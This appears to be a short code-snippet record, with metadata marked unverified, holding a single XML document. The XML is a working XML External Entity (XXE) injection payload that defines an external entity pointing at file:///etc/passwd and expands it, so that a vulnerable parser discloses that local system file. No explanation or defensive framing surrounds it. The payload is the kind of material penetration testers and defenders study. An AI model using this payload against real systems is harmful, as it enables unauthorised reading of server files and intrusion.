---
id: 4bcea00f-f2db-4d4f-8044-62d090f2f374
type: code
language: xml
verified: false
created_at: '2023-04-06T03:56:44.134010+00:00'
updated_at: '2023-04-10T20:24:39.189886+00:00'
---

# Code Snippet 4bcea00f

**Language**: xml

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```


